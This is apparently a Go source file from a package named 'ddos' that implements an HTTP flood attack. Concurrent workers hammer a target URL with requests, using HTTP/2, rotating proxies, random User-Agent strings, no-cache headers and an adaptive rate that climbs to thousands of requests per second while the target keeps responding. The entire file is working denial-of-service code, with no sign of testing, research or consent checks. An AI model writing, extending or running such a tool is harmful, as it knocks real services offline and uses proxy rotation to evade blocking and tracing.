package ddos

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync/atomic"
	"time"
)

// startFloodAttack starts HTTP flood attack
func (d *DDoSAttack) startFloodAttack() {
	d.startFloodWorkers(d.config.MaxThreads)
}

// startFloodWorkers starts specified number of flood workers
func (d *DDoSAttack) startFloodWorkers(numWorkers int) {
	var transport *http.Transport
	var err error

	// Use HTTP/2 if enabled and target is HTTPS
	if d.config.UseHTTP2 {
		useTLS, _, _ := d.shouldUseTLS(d.config.TargetURL)
		if useTLS || d.config.ForceTLS {
			transport, err = d.createHTTP2Transport()
			if err != nil {
				// Fallback to HTTP/1.1 if HTTP/2 fails
				transport = d.createHTTP1Transport(numWorkers)
			} else {
				transport.MaxIdleConns = numWorkers
				transport.MaxIdleConnsPerHost = numWorkers
			}
		} else {
			transport = d.createHTTP1Transport(numWorkers)
		}
	} else {
		transport = d.createHTTP1Transport(numWorkers)
	}

	// Configure proxy if enabled
	if d.config.UseProxy && len(d.config.ProxyList) > 0 && !d.config.RotateProxy {
		// Use first proxy for all requests
		if parsedURL, err := url.Parse(d.config.ProxyList[0]); err == nil {
			transport.Proxy = http.ProxyURL(parsedURL)
		}
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   d.config.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if !d.config.FollowRedirects {
				return http.ErrUseLastResponse
			}
			if len(via) >= 5 {
				return fmt.Errorf("stopped after 5 redirects")
			}
			return nil
		},
	}

	// Rate limiter setup
	var rateLimiter <-chan time.Time
	if d.config.RateLimit > 0 && !d.config.AdaptiveRateLimit {
		// Calculate interval per worker to achieve total rate limit
		// Formula: interval = (numWorkers * time.Second) / RateLimit
		// This ensures total rate across all workers equals RateLimit
		if numWorkers > 0 && d.config.RateLimit > 0 {
			interval := time.Duration(numWorkers) * time.Second / time.Duration(d.config.RateLimit)
			if interval < time.Millisecond {
				interval = time.Millisecond
			}
			rateLimiter = time.Tick(interval)
		}
	}

	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		if d.config.AdaptiveRateLimit {
			go d.adaptiveFloodWorker(client, d.config.RateLimit)
		} else {
			go d.floodWorker(client, rateLimiter)
		}
	}
}

// floodWorker is a single HTTP flood worker
func (d *DDoSAttack) floodWorker(client *http.Client, rateLimiter <-chan time.Time) {
	defer d.wg.Done()

	for {
		select {
		case <-d.ctx.Done():
			return
		default:
			// Rate limiting
			if rateLimiter != nil {
				select {
				case <-rateLimiter:
				case <-d.ctx.Done():
					return
				}
			}

			d.sendRequest(client)
		}
	}
}

// adaptiveFloodWorker is a flood worker with adaptive rate limiting
func (d *DDoSAttack) adaptiveFloodWorker(client *http.Client, baseRateLimit int) {
	defer d.wg.Done()

	// Adaptive rate limiting variables
	currentRate := baseRateLimit
	if currentRate <= 0 {
		currentRate = 1000 // Default starting rate
	}
	minRate := 100
	maxRate := 10000
	successCount := int64(0)
	failureCount := int64(0)
	lastAdjustment := time.Now()
	adjustmentInterval := 2 * time.Second

	// Calculate initial interval
	interval := time.Duration(1000) * time.Millisecond / time.Duration(currentRate)
	if interval < time.Millisecond {
		interval = time.Millisecond
	}
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-d.ctx.Done():
			return
		case <-ticker.C:
			// Send request
			beforeSuccess := atomic.LoadInt64(&d.requestsSuccess)
			beforeFailed := atomic.LoadInt64(&d.requestsFailed)
			d.sendRequest(client)
			afterSuccess := atomic.LoadInt64(&d.requestsSuccess)
			afterFailed := atomic.LoadInt64(&d.requestsFailed)

			// Track success/failure
			if afterSuccess > beforeSuccess {
				successCount++
			}
			if afterFailed > beforeFailed {
				failureCount++
			}

			// Adjust rate periodically
			if time.Since(lastAdjustment) >= adjustmentInterval {
				totalRequests := successCount + failureCount
				if totalRequests > 0 {
					successRate := float64(successCount) / float64(totalRequests)

					// If success rate is high and failures are low, increase rate
					if successRate > 0.8 && failureCount < successCount/10 {
						currentRate = int(float64(currentRate) * 1.2)
						if currentRate > maxRate {
							currentRate = maxRate
						}
					} else if successRate < 0.5 || failureCount > successCount {
						// If failure rate is high, decrease rate
						currentRate = int(float64(currentRate) * 0.8)
						if currentRate < minRate {
							currentRate = minRate
						}
					}

					// Update ticker interval
					interval = time.Duration(1000) * time.Millisecond / time.Duration(currentRate)
					if interval < time.Millisecond {
						interval = time.Millisecond
					}
					ticker.Reset(interval)

					// Reset counters
					successCount = 0
					failureCount = 0
					lastAdjustment = time.Now()
				}
			}
		}
	}
}

// sendRequest sends a single HTTP request
func (d *DDoSAttack) sendRequest(client *http.Client) {
	atomic.AddInt64(&d.activeConns, 1)
	defer atomic.AddInt64(&d.activeConns, -1)

	// Determine if we should use TLS and get the correct URL
	_, _, targetURL := d.shouldUseTLS(d.config.TargetURL)

	// Create a new client for proxy rotation if needed
	actualClient := client
	if d.config.UseProxy && d.config.RotateProxy && len(d.config.ProxyList) > 0 {
		// Create a new transport with rotated proxy
		idx := atomic.AddInt64(&d.proxyIndex, 1) - 1
		proxyURL := d.config.ProxyList[int(idx)%len(d.config.ProxyList)]
		if parsedURL, err := url.Parse(proxyURL); err == nil {
			tlsConfig := d.createTLSConfig()
			transport := &http.Transport{
				TLSClientConfig: tlsConfig,
				Proxy:           http.ProxyURL(parsedURL),
				DialContext: (&net.Dialer{
					Timeout:   d.config.Timeout,
					KeepAlive: 30 * time.Second,
				}).DialContext,
				DisableKeepAlives: !d.config.ReuseConnections,
			}
			actualClient = &http.Client{
				Transport:     transport,
				Timeout:       d.config.Timeout,
				CheckRedirect: client.CheckRedirect,
			}
		}
	}

	var bodyReader io.Reader
	if d.config.Body != "" {
		bodyReader = strings.NewReader(d.config.Body)
		atomic.AddInt64(&d.bytesSent, int64(len(d.config.Body)))
	}

	req, err := http.NewRequestWithContext(d.ctx, d.config.Method, targetURL, bodyReader)
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}

	// Set headers
	req.Header.Set("User-Agent", d.getRandomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Connection", "keep-alive")

	if d.config.ContentType != "" {
		req.Header.Set("Content-Type", d.config.ContentType)
	}

	// Add custom headers
	for key, value := range d.config.Headers {
		req.Header.Set(key, value)
	}

	startTime := time.Now()
	atomic.AddInt64(&d.requestsSent, 1)

	resp, err := actualClient.Do(req)
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}
	defer resp.Body.Close()

	// Read response body to complete the request
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024)) // Limit to 1MB
	atomic.AddInt64(&d.bytesReceived, int64(len(body)))

	responseTime := time.Since(startTime)
	atomic.AddInt64(&d.totalResponseTime, int64(responseTime))
	atomic.AddInt64(&d.requestsSuccess, 1)
}

